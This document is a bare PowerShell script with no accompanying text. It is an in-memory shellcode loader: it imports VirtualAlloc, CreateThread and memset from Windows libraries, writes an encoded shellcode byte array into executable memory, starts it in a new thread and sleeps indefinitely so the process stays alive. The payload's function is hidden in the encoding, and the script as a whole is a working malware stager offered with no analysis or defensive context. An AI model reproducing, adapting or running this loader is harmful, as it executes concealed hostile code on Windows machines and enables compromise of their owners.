
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc2,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0xbe,0x89,0xe6,0x42,0x54,0x31,0x72,0x18,0x03,0x72,0x18,0x83,0xea,0x75,0x04,0xb7,0xa8,0x6d,0x4b,0x38,0x51,0x6d,0x2c,0xb0,0xb4,0x5c,0x6c,0xa6,0xbd,0xce,0x5c,0xac,0x90,0xe2,0x17,0xe0,0x00,0x71,0x55,0x2d,0x26,0x32,0xd0,0x0b,0x09,0xc3,0x49,0x6f,0x08,0x47,0x90,0xbc,0xea,0x76,0x5b,0xb1,0xeb,0xbf,0x86,0x38,0xb9,0x68,0xcc,0xef,0x2e,0x1d,0x98,0x33,0xc4,0x6d,0x0c,0x34,0x39,0x25,0x2f,0x15,0xec,0x3e,0x76,0xb5,0x0e,0x93,0x02,0xfc,0x08,0xf0,0x2f,0xb6,0xa3,0xc2,0xc4,0x49,0x62,0x1b,0x24,0xe5,0x4b,0x94,0xd7,0xf7,0x8c,0x12,0x08,0x82,0xe4,0x61,0xb5,0x95,0x32,0x18,0x61,0x13,0xa1,0xba,0xe2,0x83,0x0d,0x3b,0x26,0x55,0xc5,0x37,0x83,0x11,0x81,0x5b,0x12,0xf5,0xb9,0x67,0x9f,0xf8,0x6d,0xee,0xdb,0xde,0xa9,0xab,0xb8,0x7f,0xeb,0x11,0x6e,0x7f,0xeb,0xfa,0xcf,0x25,0x67,0x16,0x1b,0x54,0x2a,0x7e,0xe8,0x55,0xd5,0x7e,0x66,0xed,0xa6,0x4c,0x29,0x45,0x21,0xfc,0xa2,0x43,0xb6,0x03,0x99,0x34,0x28,0xfa,0x22,0x45,0x60,0x38,0x76,0x15,0x1a,0xe9,0xf7,0xfe,0xda,0x16,0x22,0x6a,0xde,0x80,0x0d,0xc3,0xe0,0xce,0xe6,0x16,0xe1,0xef,0x4d,0x9f,0x07,0xbf,0xe1,0xf0,0x97,0x7f,0x52,0xb1,0x47,0x17,0xb8,0x3e,0xb7,0x07,0xc3,0x94,0xd0,0xad,0x2c,0x41,0x88,0x59,0xd4,0xc8,0x42,0xf8,0x19,0xc7,0x2e,0x3a,0x91,0xe4,0xcf,0xf4,0x52,0x80,0xc3,0x60,0x93,0xdf,0xbe,0x26,0xac,0xf5,0xd5,0xc6,0x38,0xf2,0x7f,0x91,0xd4,0xf8,0xa6,0xd5,0x7a,0x02,0x8d,0x6e,0xb2,0x96,0x6e,0x18,0xbb,0x76,0x6f,0xd8,0xed,0x1c,0x6f,0xb0,0x49,0x45,0x3c,0xa5,0x95,0x50,0x50,0x76,0x00,0x5b,0x01,0x2b,0x83,0x33,0xaf,0x12,0xe3,0x9b,0x50,0x71,0xf5,0xe0,0x86,0xbf,0x83,0x08,0x1b;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

